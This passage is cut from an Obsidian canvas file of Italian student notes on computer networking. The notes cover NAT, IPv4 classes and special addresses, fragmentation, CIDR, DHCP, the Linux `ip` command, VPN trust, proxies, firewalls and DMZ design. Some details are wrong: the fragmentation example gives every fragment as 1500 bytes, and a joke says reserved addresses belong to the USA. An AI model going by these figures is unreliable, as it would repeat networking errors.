300 31`) vengono salvate in una ***tabella di traduzione NAT***. Il pacchetto parte.\n- Il server si vede arrivare una richiesta TCP da `200.1.1.1 31`. C'è qualcosa di strano? Assolutamente no, perché il NAT è invisibile dall'esterno. Quindi lui tutto contento inizia l'handshaking e invia la prima risposta a `200.1.1.1 31`;\n- Quando al mio router arriva la risposta gli è sufficiente guardare la porta per capire a chi mandare il pacchetto. Sostituisce l'header `200.1.1.1 31` con `192.168.1.165 300` e lo spara al giusto MAC in LAN, come se niente fosse successo.\n\t- In pratica, io host sono convinto che la vera connessione sia tra `192.168.1.165 300` e `100.1.1.1 443`. Inutile dirlo, questa connessione in realtà non esiste.\n\nRiassumendo, quindi, il NAT\n\n- sostituisce l'header di rete dei datagrammi in uscita: `IP_Host Porta_Host` -> `IP_NAT Porta_NAT`;\n- salva la corrispondenza `IP_Host Porta_Host Porta_NAT` nella tabella di traduzione NAT;\n- sostituisce l'header di rete dei datagrammi in ingresso secondo la tabella di traduzione: `IP_NAT Porta_NAT`-> `IP_Host Porta_Host`.","x":-18629,"y":5217,"width":916,"height":1215,"color":"4"},
		{"id":"08f3eea3d4feef51","type":"text","text":"# Classi D ed E (Multicast e sviluppi futuri)\n\n- Il range di indirizzi da `224.0.0.0/8` a `239.0.0.0/8` è riservato al ***multicast***;\n- Il range di indirizzi da `240.0.0.0/8` a `255.0.0.0/8` è riservato ad eventuali sviluppi futuri. Questi IP possono essere utilizzati nelle reti locali, ma nessun router farà forwarding su pacchetti simili. Ovviamente *riservato* significa che sono in possesso degli USA.","x":-19655,"y":5580,"width":814,"height":187,"color":"4"},
		{"id":"99ef27d883dac209","type":"text","text":"# Classi A, B e C (Indirizzi IP Privati)\n\nPrima dell'avvento di CIDR (1993), gli indirizzi IP erano divisi in classi.\n\n- Classe A - Blocchi di IP destinati ad organizzazioni più grandi, range da `1.0.0.0/8` a `126.0.0.0/8` (si usano i primi 8 bit per identificare la classe A);\n- Classe B - Blocchi di IP più piccoli, identificati dai primi 16 bit. Range da `128.0.0.0/16` a `191.255.0.0/16`;\n- Classe C - Blocchi di IP per reti domestiche o uffici. Range da `192.168.0.0/24` a `223.255.255.0/24`.\n\nFamiliare? Perché da queste classi nascono gli ***indirizzi privati***.\n\n- Classe A - `10.0.0.0/8`;\n- Classe B - `172.16.0.0/12` ($\\Rightarrow$ iniziano con `10101100.0001xxxx`);\n- Classe C - `192.168.0.0/16`\n\nQuando mando un pacchetto entro tali range, questo non viene inoltrato in rete. Segue che lo stesso indirizzo privato può essere riutilizzato in diverse sottoreti, rendendo necessario il ***NAT***.","x":-19655,"y":5939,"width":814,"height":493,"color":"4"},
		{"id":"52fa94b909771d9b","type":"text","text":"# Indirizzi IP Speciali\n\nAlcuni indirizzi IP non identificano un'interfaccia, ma piuttosto dei comportamenti standard.\n\n- `0.0.0.0` è usato quando l'interfaccia non ha ancora un IP associato;\n- Qualsiasi IP che abbia come prefisso di rete tutti `0` si riferisce alla sottorete corrente;\n- `255.255.255.255` è un messaggio ***broadcast*** sulla LAN;\n\t- Qualsiasi IP che abbia come parte host tutti `1` è un messaggio broadcast sulla sottorete specificata nel prefisso di rete (\"Se sono admin di rete, la prima cosa che faccio è proibire i broadcast dall'esterno, sennò chiunque mi può bombardare di dati\");\n- Qualsiasi IP della forma `127.xxx.xxx.xxx` è un indirizzo di ***loopback***. Quando l'host invia un pacchetto con un IP di loopback, questo non esce dal computer ma viene trattato come pacchetto in arrivo;\n- Indirizzi privati.","x":-20635,"y":6497,"width":814,"height":420,"color":"4"},
		{"id":"3ce011a34d648316","type":"text","text":"# Frammentazione IPv4\n\nI protocolli del livello di Collegamento prevedono una dimensione massima del frame, oltre la quale è necessario \"spezzarlo\" in due $\\Rightarrow$ ***Maximum Transmission Unit*** (e.g. $MTU_{\\text{Ethernet}} = 1500 byte$).\n\nSe ad IPv4 arriva un pacchetto troppo grande, deve spezzarlo. Se il datagramma iniziale era lungo `length = 4000` devo dividerlo in 3 datagrammi più piccoli, rispettivamente\n\n1. `length = 1500, fragflag = 1, offset = 0`;\n2. `length = 1500, fragflag = 1, offset = 185`;\n3. `length = 1500, fragflag = 0, offset = 370`.\n\nSi vede bene che la frammentazione è gestita da due campi dell'header:\n\n- `fragflag` - se  `= 1` significa \"ciao, sono solo un pezzo di un datagramma più grande, dopo di me ne arriverà un altro, se sei il destinatario ci devi riassemblare grazieprego\";\n- `offset` -  tiene traccia di dove sono arrivato rispetto al messaggio iniziale, e si conta in ottetti di byte. Il primo *payload* è di $1480\\,byte$, quindi il secondo partirà dall'ottetto $1480/8 = 185$. In pratica potevano sostituirli con dei numeri progressivi, ma le cose facili non ci piacciono.\n\nQuesti tre datagrammi sono indipendenti dal punto di vista della Rete, e possono potenzialmente prendere percorsi differenti a livello di routing. L'unico a cui interessano questi campi è il destinatario, al quale spetta il compito di usarli per riassemblare il datagramma originale.\n\nIPv6 vieta la frammentazione, esplora il livello di Collegamento per trovare $MTU_{\\text{min}}$ e capire quanto grande può mandare i pacchetti. Notare che, di nuovo, viola il principio di divisione dei layer.","x":-20635,"y":7010,"width":814,"height":643,"color":"4"},
		{"id":"1f7d268a16eedc89","type":"file","file":"0 - Reti di Elaboratori/IPv4.png","x":-20586,"y":7686,"width":716,"height":334},
		{"id":"ebf647bc8c1f2c03","type":"file","file":"Area Lab1 - IPv4/IPv4.png","x":-20579,"y":8452,"width":759,"height":221},
		{"id":"d54fa96701bb55fe","type":"file","file":"Area Lab1 - IPv4/IPv4_Private.png","x":-20579,"y":8761,"width":758,"height":228},
		{"id":"9ef9565d73660350","type":"text","text":"upper layer protocol specifica cosa c'è dentro il payload (TCP, UDP, OSPF 89, ...)","x":-20464,"y":8085,"width":472,"height":116},
		{"id":"72d78acc98f57a75","type":"text","text":"# Indirizzi IPv4\n\nIdentificativo a $32\\,bit$ ($2^{32}$ indirizzamenti) pensato originariamente per individuare univocamente ogni interfaccia di rete (e.g. cavo Ethernet) di ogni nodo. Adotta un notazione decimale puntata.\n\n```\ne.g. 11011111 00000001 00000001 00000001 = 223.1.1.1\n```\n\nIn pratica, l'IP non è né *hard-coded* né specifico del dispositivo di rete. Si tratta di un indirizzo\n- ***logico*** - individua la ***posizione*** dell'interfaccia all'interno della rete (non l'interfaccia in sé);\n- ***dinamico*** - proprio in virtù del suo individuare una posizione lo stesso dispositivo può avere IP diversi a seconda di dove si trova.\n\nQuesto suggerisce di costruire l'IP in modo ***gerarchico***. La struttura degli indirizzi IP viene oggi definita dal **Classless Inter Domain Routing** (***CIDR***, 1993), e si può dividere in due parti:\n\n- Una prima parte (***prefisso***) identifica la ***sottorete*** (***subnet***).\n\t- Se due host possono raggiungersi fisicamente senza attraversare un router (e quindi senza entrare propriamente in Internet) si definiscono essere all'interno di una *sottorete*;\n\t- In generale, sono *sottoreti* tutti i gruppi di host che risultano ancora interconnessi anche togliendo i router dalla rete;\n- Una seconda parte (***host***) che identifica l'interfaccia all'interno della sottorete.\n\nPer sapere quando è lungo il prefisso e quanto l'host si possono usare due notazioni:\n\n- `223.1.1.0/24` o `223.1.1/24`- indica che i primi 24 bit sono prefisso (subnet `11011111 00000001 00000001 = 223.1.1`), e i restanti 8 sono interfacce interne a quella sottorete (ce ne possono essere fino a 256, corrispondenti ai valori dell'ultimo ottetto da `0` a `255`);\n\t- Questa notazione è un po' più *human-friendly*;\n- `IP = 223.1.1.0` `subent_mask = 255.255.255.0` - indica la stessa identica cosa dell'esempio precedente, ma usando una ***maschera di sottorete*** (***subnet mask***). Molto utile a livello computazionale: `255.255.255.0 = 11111111 11111111 11111111 00000000`, notiamo che\n\t- `IP` $\\land$ `subnet_mask` = `prefisso`;\n\t\t- Il `prefisso` è anche il primo indirizzo della sottorete;\n\t\t- Se ho un `IP_destinazione` a cui voglio comunicare, mi basta fare l'$and$ con `subnet_mask` e confrontare con la mia sottorete (ottenuta in modo analogo con il `mio_IP`) per sapere se sto parlando in locale o devo passare per il ***gateway***;\n\t- $\\neg($`subnet_mask`$)+  1  =$ quanti indirizzi IP ci sono in questa sottorete;\n\t- `IP` $\\lor\\,(\\neg($`subnet_mask`$)) =$  ultimo indirizzo della sottorete ($\\Rightarrow$ broadcast sulla sottorete).\n\n","x":-19655,"y":6497,"width":814,"height":1156,"color":"4"},
		{"id":"fc31d285a8ba2ad3","type":"text","text":"# Internet Protocol (IP)\n\nProtocollo standard *de facto* del livello di Rete. Definisce il formato del ***datagramma***, come frammentare/ricostruire i pacchetti che superano l'MTU Ethernet e la struttura degli ***indirizzi IP***.\n\n\n\n","x":-19655,"y":7762,"width":814,"height":181,"color":"6"},
		{"id":"a35f9569f0925a3a","type":"text","text":"# Data Plane\n\nA livello locale, il data plane si preoccupa di gestire il (***de)multiplexing logico e fisico dei singoli router*** ($\\Rightarrow$ associare a ogni informazione in ingresso l'uscita adeguata). Ciò avviene tramite una ***tabella di corrispondenze***, ed è detto ***forwarding***.\n\n","x":-19655,"y":8057,"width":814,"height":211,"color":"6"},
		{"id":"d76be3d4d10ad0c4","type":"text","text":"# Come fa un ISP ad ottenere un range di indirizzi IP?\n\nLa Grande Madre degli IP è l'***ICANN*** (**Internet Corporation for Assigned Names and Numbers**).\n\nQuesta gestisce l'intero spazio degli indirizzi IP a livello globale, assegnandoli in macro-blocchi a 5 ***Regional Internet Registers*** (**ARIN** Nord America, **RIPE NCC** Europa, Medio Oriente e parti dell'Asia Centrale, **APNIC** Asia-Pacifico, **LACNIC** America Latina e i Caraibi, **AFRINIC** Africa).\n\nGli ISP comprano i range di indirizzi dai RIR, dividendoli in blocchi e vendendoli alle organizzazioni.\n```\n11001000 00010111 0001yyyx xxxxxxxx <--> 200.23.16.0/20   # Comprato dall'ISP\n```\nIpotizziamo di volerli dividere in 8 blocchi, indicizzabili con 3 bit (`yyy`). Allora abbiamo\n```\n11001000 00010111 0001000x xxxxxxxx <--> 200.23.16.0/23   # Comprato da Organizzazione 1\n11001000 00010111 0001001x xxxxxxxx <--> 200.23.18.0/23   # Comprato da Organizzazione 2\n[...]\n11001000 00010111 0001111x xxxxxxxx <--> 200.23.30.0/23   # Comprato da Organizzazione 8\n```\nIn pratica, gli ISP pagano i RIR, i quali pagano l'ICANN, la quale investe in manutenzione della rete, sicurezza, ricerca e sviluppo (e.g. TLD del DNS). Gli ultimi indirizzi IPv4 sono stati assegnati ai RIR nel 2011. Ad oggi, IPv4 si tiene in piedi grazie al NAT, ed è in corso il passaggio a IPv6. ","x":-18629,"y":6497,"width":916,"height":600,"color":"4"},
		{"id":"57a7f3f226adc78b","type":"text","text":"# Come fa un host ad ottenere un indirizzo IP? (DHCP)\n\nInizialmente gli IP erano statici, quindi *hard-coded* sull'host ad opera dell'admin di rete (e.g. da `/etc/rc.config` su UNIX). Questo approccio manuale è obsoleto, ormai IP è dinamico.\n\nSi usa invece un ***protocollo Applicazione*** basato su UDP, ***DHCP*** (***Dynamic Host Configuration Protocol***). L'idea generale degli indirizzi IP è che vengano *presi in prestito*. La gestione di questi *leasing* sta al ***server DHCP***, spesso integrato nei router domestici. Questa la procedura:\n\n- Chi si connette alla sottorete cerca un server DHCP mandando broadcast un messaggio ***DHCP discover***, in cui specifica\n\t- **Sorgente** - `0.0.0.0` (\"non ho un IP\") `68`, la porta 68 è usata come standard lato client per ricevere i messaggi DHCP);\n\t- **Destinazione** - `255.255.255.255 67` broadcast sulla porta 67, su cui il server DHCP è in ascolto;\n\t- `Requested IP Address` - Eventualmente posso specificare l'IP che vorrei avere tra le opzioni facoltative. `0.0.0.0` significa \"boh, fai tu\";\n\t- **Transaction ID** - Dato che l'host non ha ancora un IP, tutti i messaggi DHCP vengono mandati broadcast. Questo valore viene scelto in modo casuale e assicura che non possano esserci conflitti;\n\t- Altre opzioni, ma si scende troppo nel tecnico e le ignoriamo;\n- Il server DHCP in ascolto sulla porta `67` vede il messaggio *discover* e risponde con una ***DHCP Offer***:\n\t- **Sorgente** - `223.1.2.5 67`, \"sono il server DHCP, e mi chiamo `Server Identifier`\";\n\t- **Destinazione** - `255.255.255.255 68`, faccio di nuovo broadcast perché il client non ha ancora un IP;\n\t- `yiaddr` - `223.1.2.4` (\"ti propongo questo IP\");\n\t- **Transaction ID** - Visto che il messaggio è ancora broadcast devo specificare a chi sto rispondendo;\n\t- **Lifetime** - Specifica quanto dura il leasing (e.g. `3600`, \"questo IP dura un'ora, poi devi chiederlo di nuovo\");\n- Questi primi due passaggi possono essere saltati se il client aveva già un indirizzo IP e vuole conservarlo;\n- A questo punto il client ha una proposta di IP. Chiede al server se può usarlo con una ***DHCP Request***. I campi sono gli stessi di una discover (il tipo di richiesta è specificato con l'`opzione 53 (DHCP Message Type`), il `Requested IP Address` (`opzione 50`) è quello dell'Offerta DHCP o il mio vecchio IP;\n\t- Anche la Request è broadcast, perché devo scegliere un solo server e comunicare ad altri eventuali server che hanno risposto con una Offer che il loro IP non verrà usato. Lo faccio tramite l'`opzione 54 (Server Identifier)`;\n- Finalmente, il server DHCP scelto dal client conferma l'IP con un messaggio ***DHCP ACK***.\n\t- Se però ho richiesto un IP non valido o non disponibile, il server risponderà con un messaggio ***DHCP NAK***, che in pratica mi costringe a ripetere tutta la procedura.\n\nOltre all'indirizzo IP del client, il server DHCP fornisce gli IP del gateway, di un server DNS e la subnet mask.","x":-18629,"y":7233,"width":916,"height":983,"color":"4"},
		{"id":"cb14f5abb112f7a1","type":"text","text":"# DHCPv4 (Reti)\n\nInizialmente gli IP erano statici, quindi *hard-coded* sull'host ad opera dell'admin di rete (e.g. da `/etc/rc.config` su UNIX). Questo approccio manuale è obsoleto, ormai IP è dinamico.\n\nSi usa invece un ***protocollo Applicazione*** basato su UDP, ***DHCP*** (***Dynamic Host Configuration Protocol***). L'idea generale degli indirizzi IP è che vengano *presi in prestito*. La gestione di questi *leasing* sta al ***server DHCP***, spesso integrato nei router domestici.\n\n- Cerco un server DHCP mandando una ***DHCP discover***, in cui specifico\n\t- **Sorgente** - `0.0.0.0` (\"non ho un IP\") `68` (standard lato client per DHCP);\n\t- **Destinazione** - `255.255.255.255 67` broadcast sulla 67 (standard lato server);\n\t- `Requested IP Address` - Eventualmente posso specificare l'IP che vorrei avere tra le opzioni facoltative. `0.0.0.0` significa \"boh, fai tu\";\n\t- **Transaction ID** - Dato che gli host non hanno ancora un IP, tutti i messaggi DHCP vengono mandati broadcast. Questo valore viene scelto in modo casuale e assicura che non possano esserci conflitti.\n- Il server DHCP vede il messaggio di `discover` e risponde con una ***DHCP Offer***:\n\t- **Sorgente** - `223.1.2.5 67`, \"sono il server DHCP, mi chiamo `Server Identifier`\";\n\t- **Destinazione** - `255.255.255.255 68` (broadcast, il client non ha ancora un IP);\n\t- `yiaddr` - `223.1.2.4` (\"ti propongo questo IP\");\n\t- **Transaction ID** - Devo specificare a chi sto rispondendo;\n\t- **Lifetime** - Specifica quanto dura il leasing (e.g. `3600`, \"questo IP dura un'ora\");\n- Se il client aveva già un indirizzo IP e vuole conservarlo salto questi primi due step;\n- A questo punto il client ha una proposta di IP. Chiede al server se può usarlo con una ***DHCP Request***. I campi sono gli stessi di una discovery (il tipo di richiesta è specificato con l'`opzione 53 (DHCP Message Type`), il `Requested IP Address` (`opzione 50`) è quello dell'Offerta DHCP o il mio vecchio IP;\n\t- Anche la Request è broadcast, perché devo scegliere un solo server e comunicare ad altri eventuali server che hanno risposto con una Offer che il loro IP non verrà usato. Lo faccio tramite l'`opzione 54 (Server Identifier)`;\n- Finalmente, il server DHCP scelto dal client conferma l'IP con un messaggio ***DHCP ACK***.\n\t- Se però ho richiesto un IP non valido o non disponibile, il server risponderà con un messaggio ***DHCP NAK***, che in pratica mi costringe a ripetere tutta la procedura.\n\nOltre a ciò, il server DHCP fornisce gli IP del gateway, di un server DNS e la subnet mask.","x":-10579,"y":9930,"width":759,"height":1095,"color":"4"},
		{"id":"e214ed120d45c08a","type":"text","text":"# Comando `ip` (= `ifconfig`+`route`+`arp`)\n\nParte del pacchetto `iproute2`. Il comando `ip` offre, similmente ai comandi `git` e `apt`, diverse sottoclassi di comandi. In questo modo unifica molti comandi precedenti.\n\n```\nip [sub-command] [target/options]\n```\n\n- Il sub-command `link` gestisce le ***interfacce di rete***;\n\t- `ip link show` mostra tutte le interfacce con relativo stato;\n\t- La keyword `set` ***modifica*** la configurazione di un'interfaccia:\n\t\t- `ip link set eth0 {up, down}` - {Attiva, Disattiva} l'interfaccia `eth0`;\n\t\t- `ip link set eth0 address [MAC]` - Cambia l'indirizzo `MAC` di `eth0` (bisogna eseguirlo con `root`).\n- `address` (alias `addr` o addirittura `a`) gestisce gli ***indirizzi IP***;\n\t- `ip addr show` - Mostra gli `IP` associati a tutte le interfacce di rete;\n\t\t- Posso anche specificarne una sola aggiungendo `dev eth0`.\n\t- `ip addr {add, del} 192.168.100.25/24 dev eth0` - {Aggiunge, Rimuove} un indirizzo `IP` con relativa maschera di sottorete all'interfaccia `eth0`;\n\t\t- Posso aggiungere la specifica `broadcast 192.168.100.31`.\n\t- `ip addr flush dev eth0` - Rimuove tutti gli `IP` associati a `eth0`.\n- `route` - Come il vecchio comando `route`, gestisce le ***routing tables***;\n\t- `ip route {add, del} 10.0.0.0/24 via 192.168.100.30` - {Aggiunge, Rimuove} la regola di routing \"`Se la destinazione è 10.x.x.x, invia il pacchetto a 192.168.100.30`\";\n\t- `ip route add default via 192.168.1.1` - Definisce `192.168.1.1` come ***default gateway*** (`ip route del default` lo rimuove);\n\t- `ip route flush` - Cancella l'intera tabella di routing.\n- `neigh` - Gestisce le ***tabelle ARP***.\n\t- `ip neigh {show, flush} dev eth0` - {Mostra, Cancella} la cache `ARP` di `eth0`;\n\t- `ip neigh add 10.0.0.2 lladdr 00:11:22:33:44:55 dev eth0` - Aggiunge una associazione `ARP` a mano (`ip neigh del 10.0.0.2 dev eth0` la rimuove);","x":-10579,"y":8600,"width":759,"height":1095,"color":"4"},
		{"id":"53ab523aeef9ec9a","type":"text","text":"# Premesse su IP (Reti di Elaboratori)","x":-19523,"y":9717,"width":549,"height":191,"color":"6"},
		{"id":"ef01ecee9344c97a","type":"file","file":"0 - Reti di Elaboratori/ICMP.png","x":-16263,"y":7899,"width":400,"height":317},
		{"id":"9b371b4161e579d9","type":"text","text":"# Quanto è affidabile una VPN?\n\nPer quanto sembri impeccabile, c'è un unico punto di failure: chi controlla la VPN ha tutti i dati. Mi devo fidare della VPN, perché sa tutto quello che mando.\n\nNon che rivendano i dati, ma possono bussare alla porta quelli dell'FBI. E se succede non possono neanche dirlo al pubblico, ma c'è uno stratagemma: usare una cosiddetta \"dichiarazione canarino\", ovvero un sito la cui sola presenza online è un messaggio del tipo \"se questa pagina esiste ancora allora i servizi segreti non sono ancora entrati\".\n\nOgni azienda che offre una VPN deve rispondere alle leggi del proprio paese. In genere conviene usare una VPN svizzera (o meglio ancora Panama).\n\n- USA, UK, Canada, Australia e Nuova Zelanda formano ***I Cinque Occhi***, un'alleanza internazionale per la condivisione di informazioni di intelligence, in particolare circa la sorveglianza elettronica. Possono essere fatte richieste invasive ai provider di VPN;\n- Se aggiungiamo Danimarca, Francia, Paesi Bassi e Norvegia otteniamo ***I Nove Occhi***;\n- Se aggiungiamo anche Germania, Belgio, ***Italia***, Spagna e Svezia arriviamo a ***Quattordici Occhi***, ma come ogni fazione che riguarda l'Italia sembra essere un po' più easy delle altre.","x":-16441,"y":7233,"width":757,"height":520,"color":"#4545ff"},
		{"id":"62d77e93a738633d","type":"text","text":"Ci sono altre $N$ cose da sfruttare per costruire servizi sfruttando l'architettura di rete (?).","x":-16600,"y":8087,"width":250,"height":129},
		{"id":"d2e5012a14662899","type":"text","text":"# Proxies\n\nIl termine \"proxy\" è utilizzato per una famiglia di oggetti di rete che fanno da intermediari in una connessione tra `client` e `server`. Gli obiettivi possono essere molteplici, li riassumiamo in:\n\n- ***Forward Proxy*** - Si pone davanti al `client` che vuole comunicare con il `server`;\n\t- Può fare da ***Application Layer Firewall***;\n\t- Può fare ***caching*** ed ***auditing***;\n\t- Può essere usato per creare un tunnel ***HTTP CONNECT***. Il `server` vede l'`IP` del proxy, ma negozia `TLS` direttamente col `client`. Il proxy diventa di fatto un router senza alcun controllo, ed è proprio per questo che non viene quasi mai consentito;\n\t- Potrebbe essere usato come ***anonymizer proxy***, ma sarebbe meglio di no. Se proprio devi, non usare mai i ***Free Proxies***, ma paga aziende come ***NordVPN*** o ***HideMyAss*** (... ma di nuovo, meglio di no. La migliore alternativa per l'anonimato è sempre ***TOR***);\n\t- Grandi entità come aziende o esercito lo usano come ***SSL Forward Proxy*** per controllare ogni attività degli utenti entro le loro reti. Nel farlo si sostituiscono ai veri `server` con le proprie CA interne (e.g. ***Burp Suite***), che devono essere *trusted* dal `client` (è quindi il punto in cui, ispezionando i certificati, posso accorgermi di essere dietro un SSL Proxy).\n- ***Reverse Proxy*** - Si pone davanti al `server` che deve essere raggiunto dai `client`. Dall'esterno il Reverse Proxy appare come il `server` reale, in realtà si limita a reindirizzare il traffico verso il vero `backend`. Ovviamente questo permette di fare ***load balancing***, ***caching*** e in generale sgravare il `backend` da compiti pesanti come ***compressione*** e ***negoziazione delle chiavi TLS***. Inoltre, può proteggerlo in quanto ***Web Application Firewall*** (***WAF***). \n- ***SOCKS Proxy*** - Simile ad `HTTP CONNECT`, ma per creare il tunnel usa il ***protocollo SOCKS*** (che in teoria dovrebbe stare per ***Socket Secure***, ma non è molto chiaro). Per farla breve, è uno degli elementi fondamentali di Internet, dal momento che si può usare per evadere i controlli dei Firewall e perfino TOR lo usa come base per far viaggiare i suoi dati crittati;\n- ***Transparent Proxy*** - Finora abbiamo parlato di proxy per i quali bisognava settare qualcosa: modificare leggermente la `GET` includendo l'`URL` del `server` (Forward Proxy), aggiungere un campo `SNI` nell'`handshaking TLS` (Reverse Proxy) o letteralmente settare un tunnel (SOCKS). Qui è diverso: **il client è completamente all'oscuro della presenza del proxy**. Questo avviene normalmente con delle regole di ***policy-based routing*** che dirottano il traffico che so di porter gestire dall'`IP` atteso a quello del proxy.\n\t- In che senso \"che so di poter gestire\"? C'è sempre il problema dei certificati, come nel Reverse Proxy. Se so che i `client` accetteranno i miei certificati \"falsi\" su `HTTP/HTTPS`, ben venga quel traffico. È invece inutile dirottare, e.g., `SSH`, perché cadrebbe tutto.\n\nInsomma, i proxy fanno tante cose. Ma se volessimo fargliene fare ancora di più? Tipo, aggiungi un banner a tutte le mail in uscita, fai una scansione antivirus su ogni risposta... rischio di ingigantirlo e rallentarlo eccessivamente. Quindi optiamo per dei plug-in esterni. Quando il proxy riceve un pacchetto su cui deve fare modifiche lo inoltra ad un ***server ICAP*** (***Internet Content Adaptation Protocol***), il quale lo restituisce con tutte le operazioni eseguite. Finalmente, il proxy può inoltrare il messaggio a chi di dovere. Ovviamente, posso avere più `server ICAP` (santa modularità).","x":-10580,"y":22538,"width":759,"height":1089,"color":"6"},
		{"id":"700cc9b921c62b5c","type":"text","text":"GUI automatic = SLAAC\n\n\n\n\n\n\nBerkeley Packet Filter (BPF) syntax (man pcap-filter)\nprotocol direction type\n33\n–Protocol: ether, tcp, udp, ip, ip6, arp\n–Direction: src, dst\n–Type: host, port, net, portrange\n–Other primitives: less, greater, gateway, broadcast\n–Combinations with operators: and (&&), or (||), not (!)\n\n# assign global unicast\n\n- manuale - chiaro\n- dynamic - su IPv4 si fa con DHCP. Qua si può fare in due modi:\n\t- stateful i.e. conosco la distribuzione degli indirizzi (DHCPv6). Quindi c'è un server che sa.\n\t\t- c'è prefix delegation per farsi assegnare un'intera rete invece di un unico coso globale\n\t- stateless, i.e. non li conosco e non mi interessano (SLAAC)\n\t- esiste metodo ibrido SLAAC + DHCPv6, dice che si usa con DNS locale per cose entro la rete (?)\n\n\n1. SLAAC (vedi SLAAC, slide 63 i rossi sono uguali perché generati allo stesso modo)\n\t1. e che succede se scegliamo lo stesso IPv6? duplicate address detection: se nessuno risponde alla mia neighbor solicitation con l'IP che voglio scegliere, allora lo scelgo\n2. router as DHCP server - identico ma cambiano delle flag (vedi rec, sta correndo un po') - you take the ip you want but look for DNS (?)\n3. solo DHCP (come IPv4).\n","x":-15620,"y":15668,"width":759,"height":797},
		{"id":"cd4e07bff0037569","type":"text","text":"# Cosa sono questi appunti\n\nVisto che non ho mai seguito Sistemi Operativi II e Network Infrastructures e che qui si fanno un botto di riferimenti a cose che non so, di fatto ci sono appunti anche su cose che non c'entrano niente con questo corso di PND. Quindi la struttura è la seguente:\n\n- A destra ci stanno le cose del CTF Bandit con tutte le cose che orbitano attorno ai comandi che non conoscevo (tipo tutti, e pure quelli che conoscevo li conoscevo poco);\n- A sinistra ci sta il corso in sé, con un sacco di digressioni.\n","x":-6043,"y":7690,"width":759,"height":424,"color":"5"},
		{"id":"75ce05720d6e4df8","type":"text","text":"# Realizzare un Firewall\n\nPartiamo col dire che non servono i salti mortali o SW complicatissimo per implementare dei filtri sul traffico. Il concetto di ***Access Control List*** (***ACL***) viene utilizzato anche da switch e router (e.g. `blocca tutto il traffico in ingresso che proviene da questo IP`). In questo caso parliamo di ***screening router***, ed è tendenzialmente ***stateless*** (i.e. non ha memoria di quello che è successo in passato, quindi se dall'interno apro una connessione legittima il firewall potrebbe bloccare la risposta).\n\nQuesto ci dice ovviamente che un Firewall può essere (e spesso è) realizzato a livello di router, ma posso anche realizzarlo tramite strumenti più potenti, tipo un ***dual-homed host*** (prendo un computer con due interfacce di rete e gli faccio filtrare il traffico in ingresso, il che è chiaramente diverso dal forwarding di un router). Ovviamente questo `host` dovrebbe essere anche protetto con tutte le misure di sicurezza possibili, se lo uso come Firewall. Un `host` particolarmente \"indurito\" prende il nome di ***bastion host***. Non sempre questi due \"set di caratteristiche\" coincidono, ma se succede sto realizzando un ***dual-homed firewall***.\n\nQui il concetto di \"indurimento\" (***hardening***) implica lo spegnimento di servizi di sistema inutilizzati o potenzialmente pericolosi, rendere più restrittivi i permessi, rimuovere account non necessari e in generale preferire configurazioni più rigide e sicure. Di base, sto togliendo tutte le possibili cose *fancy* che potrebbero nascondere delle vulnerabilità.\n\nDi norma lavoriamo sotto l'***assunzione che il Firewall sia immune agli attacchi***.","x":-8061,"y":19072,"width":759,"height":583,"color":"4"},
		{"id":"06f59f0ca1deec66","type":"text","text":"# Controllo del Traffico & DMZ\n\nPossiamo estendere il concetto di Firewall (tendenzialmente associato ad un singolo nodo della rete che filtra i pacchetti) a quello più generale di ***controllo del traffico*** sull'intera rete.\n\nQuesta cosa ovviamente viene realizzata tramite i Firewall, ma anche ***segmentando la rete*** e definendo zone con diversi permessi in termini di accessibilità. Una tipologia di zona che ci interessa particolarmente è la ***Demilitarized Zone*** (***DMZ***).\n\nEsattamente come in ambito militare una DMZ è una zona-cuscinetto tra due \"sovranità\" diverse, qui è una sottorete presa dal mio spazio di indirizzamento `IP` che espongo ad Internet. Di fatto è una zona neutra, che non è \"trusted\" come le sottoreti interne ma sulla quale l'admin di rete ha il controllo (i.e. non è \"selvaggia e senza controllo\" come Internet).\n\nBene, e che ci faccio? Posso usarla per implementare il principio di ***Defense in Depth***, visto che di fatto costituisce un primo layer in cui posso controllare il traffico che dall'esterno vorrebbe visitare le mie reti interne. Tradotto, configuro il mio edge router in modo da reindirizzare tutto il traffico in ingresso nella DMZ, dove magari metto un *bastion host* che filtra il traffico diretto alle sottoreti interne (nota che non tutto il traffico è diretto alle sottoreti interne, perché nella DMZ di norma metto i server che per definizione devono essere visibili da Internet).\n\nPosso anche immaginare scenari più complessi con una DMZ esterna ed una interna. Un `main firewall` fornisce il primo livello di protezione verso la DMZ esterna, che a sua volta esegue un controllo più granulare verso la DMZ interna, che a sua volta esegue l'ultimo controllo prima degli `host` (i quali comunque come detto hanno un loro Firewall di sistema e verosimilmente uno integrato in ogni applicazione con accesso ad Internet). Vale anche il viceversa: gli `host` possono essere obbligati a passare dalla DMZ per accedere ad Internet.\n\nTutto questo viene ovviamente fatto per eliminare il singolo point-of-failure che si avrebbe con un singolo Firewall.","x":-7052,"y":19890,"width":759,"height":1089,"color":"4"},
		{"id":"e1c66ffc8f1035d1","type":"text","text":"# Make it Stateful !\n\nAbbiamo detto che una ACL è tendenzialmente stateless. Ovviamente questo può essere noioso, perché significa dover includere nelle regole una previsione per tutti i possibili tipi di risposta ad una connessione legittimamente aperta dall'interno della rete privata, e.g.\n\n```bash\nallow src = our_host dest_port = 25  # Allow opening SMTP connections\nallow src_port = 25 flags = ACK      # Allow their replies\n```\n\nPer ovviare a questo problema (e ad altri, e.g. se la frammentazione viene fatta male potrei non rendermi conto di cosa è una risposta e cosa no) dovremmo essere in grado di renderci conto quando un flusso di traffico arriva in risposta ad una connessione `TCP` già aperta, i.e. rendere il firewall ***stateful***. Come?\n\nIntroduciamo il concetto di ***Connection Tracking***. i.e. teniamo traccia delle connessioni aperte, preferibilmente dall'interno. Questo è ovvio per un protocollo come TCP con le sue varie `SYN`, `SYNACK` e compagnia cantante, mentre per UDP creiamo noi a livello di Firewall una connessione fittizia che viene chiusa se riceviamo la risposta o se scade un timer.\n\nIn `iptables`, questa roba si realizza con l'opzione `-m state --state s`.","x":-7052,"y":19072,"width":759,"height":583,"color":"4"},
